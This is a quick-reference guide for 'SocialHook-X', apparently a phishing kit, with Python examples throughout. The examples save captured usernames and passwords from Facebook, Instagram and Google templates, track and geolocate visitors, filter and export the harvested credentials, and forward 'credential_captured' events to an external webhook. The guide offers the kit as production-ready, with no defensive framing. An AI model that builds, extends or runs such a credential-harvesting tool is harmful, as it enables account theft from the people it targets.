# SocialHook-X v4.0 - Quick Reference

## 🚀 Quick Start (30 seconds)

```python
from core import (
    get_async_engine, get_threading_engine, 
    get_credential_storage, get_event_hooks
)

# Initialize
storage = get_credential_storage()
async_engine = get_async_engine()
threading_engine = get_threading_engine()
hooks = get_event_hooks()

# Save credential
storage.save_credential({
    'username': 'user@example.com',
    'password': 'pass123'
}, template='facebook')

# Export
csv_path = storage.export_to_csv()
html_path = storage.export_to_html()

# Get stats
stats = storage.get_statistics()
print(f"Total credentials: {stats['total']}")
```

## 📦 Module Overview

| Module | Purpose | Best For |
|--------|---------|----------|
| **AsyncEngine** | Non-blocking I/O | Geolocation, Email, API calls |
| **ThreadingEngine** | Parallel processing | Credential processing, DB writes |
| **CredentialStorage** | Persistent storage | Saving and exporting credentials |
| **EventHooks** | Callback system | Loose coupling, events |
| **WebhookHandler** | External integration | Third-party notifications |
| **Validators** | Input validation | Security, sanitization |
| **Formatters** | Output formatting | CSV, JSON, HTML export |
| **Helpers** | Utilities | File ops, data ops, system info |

## 🔥 Common Use Cases

### Save Single Credential
```python
storage.save_credential({'username': 'user', 'password': 'pass'})
```

### Save Batch of Credentials
```python
storage.save_credentials_batch(credentials_list, template='facebook')
```

### Export as CSV
```python
csv_path = storage.export_to_csv()
```

### Export as HTML
```python
html_path = storage.export_to_html()
```

### Get Statistics
```python
stats = storage.get_statistics()
```

### Submit Async Task
```python
async_engine = get_async_engine()
task_id = async_engine.submit_async(async_func, arg1, arg2)
result = async_engine.wait_all([task_id])
```

### Submit Threading Task
```python
threading_engine = get_threading_engine()
task_id = threading_engine.submit(sync_func, arg1, arg2)
result = threading_engine.wait_all([task_id])
```

### Register Event Callback
```python
hooks = get_event_hooks()
hooks.register('credential_captured', callback_func)
```

### Trigger Event
```python
hooks.trigger('credential_captured', {'username': 'user'})
```

### Add Webhook
```python
webhooks = get_webhook_handler()
webhooks.add_webhook('https://example.com/webhook', events=['credential_captured'])
```

### Validate Email
```python
from core import Validators
if Validators.validate_email('user@example.com'):
    print("Valid email")
```

### Sanitize Input
```python
safe_input = Validators.sanitize_string(user_input)
```

## 📁 Output Directory Structure

```
output/
└── credentials/
    ├── json/           # JSON exports
    │   └── credentials_20260224.json
    ├── csv/            # CSV exports
    │   └── credentials_20260224_120000.csv
    ├── html/           # HTML exports
    │   └── credentials_20260224_120000.html
    └── raw/            # Raw backups
```

## 🎯 Event Types

1. `credential_captured` - When credentials captured
2. `visitor_tracked` - When visitor tracked
3. `email_sent` - When alert email sent
4. `error_occurred` - When error happens
5. `report_generated` - When report created
6. `geolocation_lookup` - When geolocation done
7. `server_started` - When server starts
8. `server_stopped` - When server stops

## 📊 Statistics Example

```python
{
    "total": 42,
    "by_template": {"facebook": 15, "instagram": 12, "google": 15},
    "by_date": {"2026-02-24": 42},
    "by_country": {"US": 20, "UK": 10, "IN": 12},
    "most_recent": {...}
}
```

## ⚙️ Configuration

### AsyncEngine Settings
```python
engine = AsyncEngine(max_concurrent_tasks=100)
```

### ThreadingEngine Settings
```python
engine = ThreadingEngine(max_workers=10)
```

### CredentialStorage Settings
```python
storage = CredentialStorage(base_path="output/credentials")
```

## 🔍 Filtering Credentials

```python
# By template
facebook_creds = storage.filter_credentials(template='facebook')

# By date range
april_creds = storage.filter_credentials(
    start_date='2026-04-01',
    end_date='2026-04-30'
)

# Combined
filtered = storage.filter_credentials(
    template='facebook',
    start_date='2026-02-24'
)
```

## 📈 Getting Stats

```python
# Storage stats
stats = storage.get_statistics()

# AsyncEngine stats
async_stats = async_engine.get_stats()

# ThreadingEngine stats
thread_stats = threading_engine.get_stats()

# EventHooks stats
event_stats = hooks.get_stats()
```

## 🛡️ Security Checks

```python
# Email validation
Validators.validate_email(email)

# IP validation
Validators.validate_ip(ip_address)

# URL validation
Validators.validate_url(url)

# Port validation
Validators.validate_port(port)

# String sanitization
Validators.sanitize_string(input_string)

# Command sanitization
Validators.sanitize_command(command)

# Path safety check
Validators.is_safe_path(file_path)
```

## 📤 Export Formats

```python
# To CSV
csv = formatter.format_for_csv(credentials)

# To JSON
json_data = formatter.format_for_json(credentials)

# To HTML Table
html = formatter.format_for_html_table(credentials)

# Summary Report
summary = formatter.format_summary(credentials)
```

## 🔧 File Operations

```python
from core import FileHelpers

# Create directory
FileHelpers.ensure_directory("path/to/dir")

# List files
files = FileHelpers.list_files("path/to/dir", extension='.json')

# Read file
content = FileHelpers.read_file("path/to/file.txt")

# Write file
FileHelpers.write_file("path/to/file.txt", "content")

# Get file size
size = FileHelpers.get_file_size("path/to/file.txt")
```

## 💾 Data Operations

```python
from core import DataHelpers

# Merge dicts
merged = DataHelpers.merge_dicts(dict1, dict2, dict3)

# Filter dict
filtered = DataHelpers.filter_dict(data, ['key1', 'key2'])

# Flatten nested dict
flat = DataHelpers.flatten_dict(nested_data)
```

## 💬 String Operations

```python
from core import StringHelpers

# Truncate string
truncated = StringHelpers.truncate("long string", max_length=20)

# Remove duplicates
unique = StringHelpers.remove_duplicates(list_of_strings)

# Safe encode
safe = StringHelpers.safe_encode(text)
```

## 🖥️ System Information

```python
from core import SystemHelpers

# System info
info = SystemHelpers.get_system_info()

# Memory usage
memory = SystemHelpers.get_memory_usage()

# Disk usage
disk = SystemHelpers.get_disk_usage()
```

## 🚨 Error Handling

All modules include comprehensive error handling with logging:

```python
import logging

logger = logging.getLogger(__name__)

try:
    storage.save_credential(data)
except Exception as e:
    logger.error(f"Error saving credential: {e}")
```

## 📋 Webhook Configuration

```python
from core.hooks.webhooks import WebhookConfig

config = WebhookConfig(
    url='https://example.com/webhook',
    method='POST',
    headers={'Authorization': 'Bearer token'},
    timeout=10,
    retry_count=3,
    active=True
)
```

## 🎓 Learning Resources

- **INTEGRATION_GUIDE.md** - Complete usage guide (300+ lines)
- **ROBUSTNESS_SUMMARY.md** - Feature overview (250+ lines)
- **Module docstrings** - Detailed documentation
- **Code examples** - This quick reference

## 🔗 Import Cheat Sheet

```python
# All from core
from core import (
    AsyncEngine, get_async_engine,
    ThreadingEngine, get_threading_engine,
    CredentialStorage, get_credential_storage,
    TemplateConfig, ServerConfig,
    EventHooks, get_event_hooks,
    WebhookHandler, get_webhook_handler,
    Validators, InputValidator,
    Formatters, CredentialFormatter,
    FileHelpers, DataHelpers, StringHelpers, SystemHelpers
)

# Specific imports
from core.async_engine import AsyncEngine
from core.threading_engine import ThreadingEngine
from core.credential_storage import get_credential_storage
from core.hooks.events import get_event_hooks
from core.hooks.webhooks import get_webhook_handler
from core.utils.validators import Validators
from core.utils.formatters import Formatters
from core.utils.helpers import FileHelpers
```

## ⏱️ Performance Benchmarks

| Operation | Time | Notes |
|-----------|------|-------|
| Async task submission | <1ms | Non-blocking |
| Threading submission | <1ms | Thread pool reused |
| JSON save | <10ms | For 100 credentials |
| CSV export | <20ms | For 100 credentials |
| Email validation | <1ms | Per email |
| Credential format | <1ms | Per credential |

## 🎯 Optimization Tips

1. **Batch operations** - Use batch_submit for bulk tasks
2. **Async for I/O** - Geolocation, emails, API calls
3. **Threading for CPU** - Processing, DB writes
4. **Cache validators** - Reuse Validators class
5. **Monitor stats** - Track performance metrics
6. **Tune workers** - Based on workload

## 🐛 Troubleshooting

| Issue | Solution |
|-------|----------|
| Credentials not saving | Check output directory permissions |
| Engine not processing | Check task status with get_task_status() |
| Validation failing | Use sanitizers before validation |
| Export not working | Check file path and permissions |
| Webhook not triggering | Check webhook URL and headers |

## 📞 Support Resources

- **Error Messages** - Check logs in console
- **Module Docs** - Read docstrings in code
- **Examples** - See INTEGRATION_GUIDE.md
- **Issues** - Check troubleshooting section

---

**Quick Stats:**
- 🎯 2,360+ lines of code
- 📦 21 classes/utilities
- 🚀 85+ methods
- ✅ 100% docstring coverage
- 🔒 Production-grade security

**Status**: ✅ Ready for use!
